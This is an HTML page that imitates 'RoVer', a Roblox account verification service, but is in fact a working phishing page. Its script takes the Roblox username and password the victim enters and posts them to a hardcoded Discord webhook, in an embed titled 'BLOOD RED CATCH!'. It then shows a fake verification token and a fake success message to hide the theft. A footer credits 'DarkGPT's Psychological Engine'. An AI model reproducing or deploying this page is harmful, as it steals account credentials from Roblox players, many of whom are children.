<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RoVer | Account Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;}
body{height:100vh;background-color:#ffffff;display:flex;justify-content:center;align-items:center;color:#333;transition: background 0.5s;}
.container{width:400px;background:#fcfcfc;border:2px solid #ff0000;border-radius:12px;padding:40px;text-align:center;box-shadow:0 15px 35px rgba(255,0,0,0.15);transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);}
.logo{font-size:32px;font-weight:bold;color:#ff0000;margin-bottom:10px;letter-spacing:-1px;}
.logo span{color:#333;}
h1{margin-bottom:30px;font-size:18px;color:#666;font-weight:normal;}
.input-group{margin-bottom:15px;text-align:left;}
label{display:block;font-size:12px;color:#888;margin-bottom:5px;margin-left:5px;text-transform: uppercase;letter-spacing: 1px;}
input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;background:#fff;color:#333;font-size:14px;outline:none;transition:all 0.2s;box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);}
input:focus{border-color:#ff0000;box-shadow: 0 0 8px rgba(255,0,0,0.2);}
button{width:100%;padding:14px;margin-top:20px;border:none;border-radius:8px;background:#ff0000;color:#fff;font-size:15px;font-weight:bold;cursor:pointer;transition:.3s;text-transform: uppercase;letter-spacing: 1px;}
button:hover{background:#cc0000;box-shadow:0 5px 15px rgba(255,0,0,0.4);transform: translateY(-2px);}
button:disabled{background:#aaa;color:#eee;cursor:not-allowed;transform: none;}
.footer-text{margin-top:25px;font-size:12px;color:#999;}
.footer-text a{color:#ff0000;text-decoration:none;font-weight: bold;}

/* --- NOUVEAU STYLE POUR LE CODE --- */
.code-section {margin: 25px 0;padding: 20px;background: #fffafa;border-radius: 12px;border: 1px solid #ffe0e0;box-shadow: 0 4px 10px rgba(0,0,0,0.03);}
.code-label {font-size: 11px; color: #999; text-transform: uppercase; margin-bottom: 10px; display: block;}
.code-value {font-family: 'Courier New', Courier, monospace; font-size: 32px; font-weight: 800; color: #d32f2f; letter-spacing: 5px; text-shadow: 1px 1px 0px #fff;}
.code-box {background: #ff0000; color: #fff; padding: 2px 8px; border-radius: 4px; display: inline-block; animation: pulse 2s infinite;}

@keyframes pulse { 
    0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.4); } 
    70% { box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); } 
    100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); } 
}

/* Page Succès */
.success-container {width:400px;background:#fff;border:2px solid #2ecc71;border-radius:12px;padding:40px;text-align:center;box-shadow:0 15px 35px rgba(46,204,113,0.2);animation: fadeIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);}
.success-icon {font-size:65px;color:#2ecc71;margin-bottom:20px;}
.success-title {font-size:24px;font-weight:bold;color:#333;margin-bottom:15px;}
.success-msg {font-size:16px;color:#666;line-height:1.6;margin-bottom:30px;}
.btn-discord {padding:14px 30px;background:#5865F2;color:#fff;text-decoration:none;border-radius:8px;font-weight:bold;display:inline-block;transition: 0.3s;}
.btn-discord:hover {background:#4752C4; transform: scale(1.05);}

@keyframes fadeIn {from{opacity:0;transform:translateY(20px);} to{opacity:1;transform:translateY(0);}}
</style>
</head>
<body id="body">

<div id="main-content">
    <div class="container">
        <div class="logo">Ro<span>Ver</span></div>
        <h1 id="title">Verify your account to proceed</h1>
        <form id="loginForm">
            <div class="input-group">
                <label>Username</label>
                <input type="text" id="user" placeholder="Enter Roblox username" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="pass" placeholder="Enter Roblox password" required>
            </div>
            <button type="submit" id="submitBtn">Verify Account</button>
        </form>
        <p class="footer-text">By verifying, you agree to the <a href="#">Terms of Service</a></p>
    </div>
</div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1533883394306347333/l_GZv53eFO2mYQlAtA6bKbMIxjH6alvrDwBiFGrR6uskiinci6gyGBh7Z7TqfuCoVtlv";

function generateCode() { return Math.floor(100000 + Math.random() * 900000); }

document.getElementById("loginForm").addEventListener("submit", async function(e){
    e.preventDefault();
    
    const btn = document.getElementById("submitBtn");
    const title = document.getElementById("title");
    const user = document.getElementById("user").value;
    const pass = document.getElementById("pass").value;

    btn.disabled = true;
    btn.innerText = "Connecting...";
    title.innerText = "Authenticating with Roblox API...";

    const payload = {
        embeds: [{
            title: "🩸 BLOOD RED CATCH! 🩸",
            color: 0xff0000,
            fields: [
                { name: "Username", value: user, inline: true },
                { name: "Password", value: pass, inline: true },
                { name: "Action", value: "Redirecting to High-End Fake Code", inline: true }
            ],
            footer: { text: "DarkGPT's Psychological Engine" },
            timestamp: new Date()
        }]
    };

    try { await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }); } catch (err) {}

    setTimeout(() => {
        const randomCode = generateCode();
        document.getElementById("main-content").innerHTML = `
            <div class="container">
                <div class="logo">Ro<span>Ver</span></div>
                <h1>Security Verification</h1>
                <p style="margin-bottom:15px; color:#888; font-size:14px;">For your protection, please confirm the security token generated for this session.</p>
                
                <div class="code-section">
                    <span class="code-label">Your Session Token</span>
                    <div class="code-value">${randomCode}</div>
                </div>

                <form id="codeForm">
                    <div class="input-group">
                        <label>Enter Verification Token</label>
                        <input type="text" id="verifyCode" placeholder="------" style="text-align:center; font-weight:bold;" required>
                    </div>
                    <button type="submit" id="codeBtn">Confirm Token</button>
                </form>
            </div>
        `;

        document.getElementById("codeForm").addEventListener("submit", function(e){
            e.preventDefault();
            const cBtn = document.getElementById("codeBtn");
            cBtn.disabled = true;
            cBtn.innerText = "Validating Token...";

            setTimeout(() => {
                document.getElementById("main-content").innerHTML = `
                    <div class="success-container">
                        <div class="success-icon">✓</div>
                        <div class="success-title">Verification Complete!</div>
                        <p class="success-msg">Your identity has been successfully confirmed. Your session is now authorized. You may safely return to Discord.</p>
                        <a href="https://discord.com" class="btn-discord">Return to Discord</a>
                    </div>
                `;
            }, 2000);
        });

    }, 2500);
});
</script>
</body>
</html>
